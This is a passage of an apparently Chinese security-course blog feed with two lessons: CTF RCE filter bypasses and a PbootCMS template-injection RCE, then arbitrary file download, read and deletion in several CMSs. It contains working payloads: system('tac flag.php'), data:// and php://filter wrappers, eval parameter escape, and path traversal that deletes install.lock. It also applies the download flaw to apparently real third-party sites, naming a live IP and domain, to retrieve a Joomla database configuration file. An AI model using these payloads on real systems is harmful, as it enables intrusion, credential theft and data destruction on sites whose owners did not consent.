src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201182052825.png" alt="image-20230201182052825"></p><p>解法一：echo shell_exec(‘tac fla*.ph*’);</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201182235961.png" alt="image-20230201182235961"></p><p>解法二：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`cp fla*.ph* 2.txt`</span><br></pre></td></tr></table></figure><p>(把flag.php复制到2.txt，再访问2.txt同样效果)</p><h6 id="31-参数逃逸"><a href="#31-参数逃逸" class="headerlink" title="31-参数逃逸"></a>31-参数逃逸</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201182847606.png" alt="image-20230201182847606"></p><p>eval($_GET[1]);&amp;1&#x3D;system(‘tac flag.php’);&#x2F;&#x2F;构建一个新的参数逃逸过滤</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201183039977.png" alt="image-20230201183039977"></p><h6 id="32-36-配合包含-amp-伪协议"><a href="#32-36-配合包含-amp-伪协议" class="headerlink" title="32~36-配合包含&amp;伪协议"></a>32~36-配合包含&amp;伪协议</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201183152369.png" alt="image-20230201183152369"></p><p>include$_GET[a]?&gt;&amp;a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<code>&lt;?=system(&#39;tac flag.php&#39;);?&gt;</code></p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201183527298.png" alt="image-20230201183527298"></p><p>用php协议:include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201183952839.png" alt="image-20230201183952839"></p><h6 id="37-39-包含-amp-伪协议-amp-通配符"><a href="#37-39-包含-amp-伪协议-amp-通配符" class="headerlink" title="37~39-包含&amp;伪协议&amp;通配符"></a>37~39-包含&amp;伪协议&amp;通配符</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201184217562.png" alt="image-20230201184217562"></p><p>data:&#x2F;&#x2F;text&#x2F;plain,<code>&lt;?=system(&#39;tac fla*&#39;);?&gt;</code></p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201184358529.png" alt="image-20230201184358529"></p><p>php:&#x2F;&#x2F;input post:<code>&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code></p><h4 id="代码审计-PbootCMS-RCE代码执行"><a href="#代码审计-PbootCMS-RCE代码执行" class="headerlink" title="#代码审计-PbootCMS-RCE代码执行"></a>#代码审计-PbootCMS-RCE代码执行</h4><blockquote><p>靶场：PbootCMS</p><p>流程：搜索特定函数-&gt;parserIfLabel-&gt;parserCommom-&gt;About&amp;Content-&gt;构造</p><p>AboutController：{pboot:if(eval($_POST[1]))}!!!{&#x2F;pboot:if}</p><p>ContentController：&#x2F;index.php&#x2F;Content&#x2F;2?keyword&#x3D;{pboot:if(eval($_REQUEST[1]));&#x2F;&#x2F;)})}}{&#x2F;pboot:if}&amp;1&#x3D;phpinfo();</p></blockquote><p>这个漏洞目前找到5处，新版本和老版本不同的是新版本加了过滤，但是可以绕过，漏洞函数在ParserController.php里。在2330多行这里，parserIfLabel()方法中调用了eval函数。而且前面有过滤。先忽略过滤内容，一会回来看，看下哪里调用了parserfLabel方法。</p><p>找到了parserIfLabel()方法，而且从下面可以看到在ParserController.php中parserAfter()方法调用了parserIfLabel()方法。</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/v2-68fa290adfcb378cae6cb3153e294e11_r.jpg" alt="img"></p><p>打开，找到函数右键全文追踪：</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202160332177.png" alt="image-20230202160332177"></p><p>找到调用parserIflabel()的是parserCommon()方法:</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202161230831.png" alt="image-20230202161230831"></p><p>所以谁调用了parserCommon()，谁就会触发parserIflabel()，全局搜索parserCommon()被谁调用,搜索后发现五处:（举例3处）</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202161505479.png" alt="image-20230202161505479"></p><p><strong>1、index处：</strong></p><p>验证下是否可以控制前端输出，以Index试一下，可以看到已经可以控制前端输出，说明存在漏洞:</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/v2-529c75a220fb17244f12f9259f995222_1440w.webp" alt="img"></p><p>构造payload：</p><p><a href="http://127.0.0.1/PbootCMS/index.php/index/index?keyword=%7Bpboot:if(1)$a=$_GET%5Bb%5D;$a();;//)%7D)%7D%7D%7B/pboot:if%7D&b=phpinfo()">http://127.0.0.1/PbootCMS/index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();;//)})}}{/pboot:if}&amp;b=phpinfo()</a>;</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202162413935.png" alt="image-20230202162413935"></p><p><strong>2、about留言处：（需要后台审核）</strong></p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202163621935.png" alt="image-20230202163621935"></p><p>将代码echo出来</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202163759128.png" alt="image-20230202163759128"></p><p>显示变量1可控</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202163650254.png" alt="image-20230202163650254"></p><p>然后</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202163913648.png" alt="image-20230202163913648"></p><p><strong>3、content处：</strong></p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202165246027.png" alt="image-20230202165246027"></p><h4 id="层面-探针-语言-amp-CMS框架-amp-中间件"><a href="#层面-探针-语言-amp-CMS框架-amp-中间件" class="headerlink" title="#层面-探针-语言&amp;CMS框架&amp;中间件"></a>#层面-探针-语言&amp;CMS框架&amp;中间件</h4><p><a href="http://vulfocus.io/">http://vulfocus.io/ </a> Shiro weblogic</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、RCE执行-代码执行&amp;amp;命令执行&lt;/p&gt;
&lt;p&gt;2、CTF考点-漏洞配合&amp;amp;绕过手法&lt;/p&gt;
&lt;p&gt;3、</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day43 WEB攻防-通用漏洞&amp;任意文件下载&amp;删除重装&amp;敏感读取&amp;黑白审计</title>
    <link href="http://example.com/2023/01/31/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2023/01/31/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/</id>
    <published>2023-01-31T09:00:25.000Z</published>
    <updated>2023-02-01T09:03:43.029Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、文件操作类安全问题</p><p>2、文件下载&amp;删除&amp;读取</p><p>3、白盒&amp;黑盒&amp;探针分析</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><p>文件读取：基本和文件下载利用类似</p><p>文件下载：利用下载获取源码或数据库配置文件及系统敏感文件为后续出思路</p><p>文件删除：除自身安全引发的文件删除外，可配合删除重装锁定文件进行重装</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 审计分析-文件下载-XHCMS-功能点</p><p>➢ 审计分析-文件读取-MetInfo-函数搜索</p><p>➢ 审计分析-文件删除-74CMS-函数搜索</p><p>➢ 黑盒分析-下载读取-下载资源URL参数</p><h4 id="白盒审计："><a href="#白盒审计：" class="headerlink" title="#白盒审计："></a>#白盒审计：</h4><h5 id="1、文件下载"><a href="#1、文件下载" class="headerlink" title="1、文件下载"></a>1、文件下载</h5><p>流程-功能点抓包-寻代码文件-寻变量控制-构造测试</p><p>Payload: softadd&#x3D;d:&#x2F;1.txt softadd2&#x3D;d:&#x2F;1.txt</p><h5 id="2、文件删除：74CMS-配合删除重装"><a href="#2、文件删除：74CMS-配合删除重装" class="headerlink" title="2、文件删除：74CMS-配合删除重装"></a>2、文件删除：74CMS-配合删除重装</h5><p>流程-特定函数搜索-寻触发调用-构造Payload测试</p><p>Payload: &#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;..&#x2F;..&#x2F;data&#x2F;install.lock</p><h5 id="3、文件读取：MetInfo-任意读取"><a href="#3、文件读取：MetInfo-任意读取" class="headerlink" title="3、文件读取：MetInfo-任意读取"></a>3、文件读取：MetInfo-任意读取</h5><p>流程-特定函数搜索-寻触发调用-构造Payload测试</p><p>Payload：&#x2F;include&#x2F;thumb.php?dir&#x3D;http....\config\config_db.php</p><h4 id="黑盒探针"><a href="#黑盒探针" class="headerlink" title="#黑盒探针"></a>#黑盒探针</h4><h5 id="1、URL参数名及参数值分析："><a href="#1、URL参数名及参数值分析：" class="headerlink" title="1、URL参数名及参数值分析："></a>1、URL参数名及参数值分析：</h5><p>参数名：英文对应翻译</p><p>参数值：目录或文件名</p><h5 id="2、功能点自行修改后分析："><a href="#2、功能点自行修改后分析：" class="headerlink" title="2、功能点自行修改后分析："></a>2、功能点自行修改后分析：</h5><p>文件下载，删除，读取等</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h5 id="➢-审计分析-文件下载-XHCMS-功能点"><a href="#➢-审计分析-文件下载-XHCMS-功能点" class="headerlink" title="➢ 审计分析-文件下载-XHCMS-功能点"></a>➢ 审计分析-文件下载-XHCMS-功能点</h5><p>判断下载文件能不能控制</p><p>数据库查询过来-&gt;$down[‘softadd’];-&gt;$fileadd-&gt;$sourceFile下载文件变量</p><h5 id="➢-审计分析-文件读取-MetInfo-函数搜索"><a href="#➢-审计分析-文件读取-MetInfo-函数搜索" class="headerlink" title="➢ 审计分析-文件读取-MetInfo-函数搜索"></a>➢ 审计分析-文件读取-MetInfo-函数搜索</h5><p>流程-特定函数搜索-寻触发调用-构造Payload测试</p><p>搜索一些文件读取的函数：cnblogs.com&#x2F;gyrgyr&#x2F;p&#x2F;5774436.html</p><p>1.fread  2.fgets  3.fgetss   4.file   5.readfile   6.file_get_contents   7.fpassthru</p><p>通过查找函数readfile找到这个路径下的readfile</p><p>靶场：Metlnfo6.0.0</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201150457805.png" alt="image-20230201150457805"></p><p>找到控制读取文件的变量$dir</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201150628834.png" alt="image-20230201150628834"></p><p>查找$dir从哪里来，全局搜索$dir</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201150944356.png" alt="image-20230201150944356"></p><p>然后看谁调用了这个文件的对象class old_thumb全局搜索</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201151034843.png" alt="image-20230201151034843"></p><p>找到位置：</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201151102971.png" alt="image-20230201151102971"></p><p>访问Payload：&#x2F;include&#x2F;thumb.php?dir&#x3D;http....\config\config_db.php读取到数据库配置文件</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201151735482.png" alt="image-20230201151735482"></p><p>访问要加http&#x2F;是因为代码中的需求：</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201154936491.png" alt="image-20230201154936491"></p><h5 id="➢-审计分析-文件删除-74CMS-函数搜索"><a href="#➢-审计分析-文件删除-74CMS-函数搜索" class="headerlink" title="➢ 审计分析-文件删除-74CMS-函数搜索"></a>➢ 审计分析-文件删除-74CMS-函数搜索</h5><p>靶场：74cms3.4</p><p>全局搜索php文件删除函数unlink</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201161448482.png" alt="image-20230201161448482"></p><p>进入admin_article.php发现只有act&#x3D;del_img时才会触发删除，这里的$upfiles，$thumb_dir和$img都没有写死，可以控制</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201161625063.png" alt="image-20230201161625063"></p><p>追踪$thumb_dir发现其是固定目录的变量，确定它是删除在data下的再下一级(变量updor_thumb)的文件(两个目录)</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201163035375.png" alt="image-20230201163035375"></p><p>所以如果想删除根目录下的1.txt，则构造payload: &#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;..&#x2F;..&#x2F;1.txt(从变量updor_thumb的目录跳到data，再data往上到根目录)</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201162809665.png" alt="image-20230201162809665"></p><p>删除成功！</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201163612582.png" alt="image-20230201163612582"></p><p>若要删除安装文件data下的install.lock </p><p>Payload: &#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;..&#x2F;..&#x2F;data&#x2F;install.lock</p><p>Payload: &#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;..&#x2F;install.lock也可以，因为一个..&#x2F;就返回到了data目录下，..&#x2F;..&#x2F;data&#x2F;install.lock只是第二个..&#x2F;从data返回到根目录，后面接&#x2F;data是又回到data目录下</p><h5 id="➢-黑盒分析-下载读取-下载资源URL参数（真实环境）"><a href="#➢-黑盒分析-下载读取-下载资源URL参数（真实环境）" class="headerlink" title="➢ 黑盒分析-下载读取-下载资源URL参数（真实环境）"></a>➢ 黑盒分析-下载读取-下载资源URL参数（真实环境）</h5><blockquote><p>下载文件URL</p><p>没有安全问题：</p><p><a href="http://www.xiaodi8.com/soft/2.zip">www.xiaodi8.com/soft/2.zip</a> 直连下载</p><p><a href="http://www.xiaodi8.com/soft/index.php">www.xiaodi8.com/soft/index.php</a></p><p>可能安全问题</p><p><a href="http://www.xiaodi8.com/down?file=1.zip">www.xiaodi8.com/down?file=1.zip</a></p><p>代码用下载协议去解析文件</p><p><a href="http://www.xiaodi8.com/down?file=index.php">www.xiaodi8.com/down?file=index.php</a></p></blockquote><p>1、网站：<a href="http://67.202.70.133/files/readfile.php?file=">http://67.202.70.133/files/readfile.php?file=</a></p><p>访问：<a href="http://67.202.70.133/files/readfile.php?file=index.php%E6%84%8F%E6%80%9D%E6%98%AF%E4%B8%8B%E8%BD%BDfiles%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84index.php%E6%B2%A1%E6%9C%89%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E9%A6%96%E9%A1%B5%E6%96%87%E4%BB%B6%E5%9C%A8%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%92%8Cfiles%E5%90%8C%E7%BA%A7%EF%BC%8C%E6%89%80%E4%BB%A5%E8%A6%81%E8%AE%BF%E9%97%AE%EF%BC%9Ahttp://67.202.70.133/files/readfile.php?file=../index.php%E6%89%8D%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD%E5%88%B0">http://67.202.70.133/files/readfile.php?file=index.php意思是下载files目录下的index.php没有这个文件，首页文件在根目录下和files同级，所以要访问：http://67.202.70.133/files/readfile.php?file=../index.php才可以下载到</a></p><p>下载后打开发现很多包含文件，都可以下载，或者直接找到这套程序的cms：Joomla，在网上查找其数据库文件的路径发现是：..&#x2F;configuration.php</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201143505961.png" alt="image-20230201143505961"></p><p>所以访问<a href="http://67.202.70.133/files/readfile.php?file=../configuration.php%E5%B0%B1%E4%B8%8B%E8%BD%BD%E5%88%B0%E4%BA%86%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6">http://67.202.70.133/files/readfile.php?file=../configuration.php就下载到了数据库文件</a></p><p>2、网站：<a href="http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMzAxMDMvZGJrZ3l5XzEuOS4yX2RhbmdiZWkuYXBr">http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMzAxMDMvZGJrZ3l5XzEuOS4yX2RhbmdiZWkuYXBr</a></p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201143250340.png" alt="image-20230201143250340"></p><p>此处的&#x2F;down&#x2F;20211229是从根目录开始的，所以下载index.php直接前面加&#x2F;就可以了</p>]]></content>
    
    
      
      
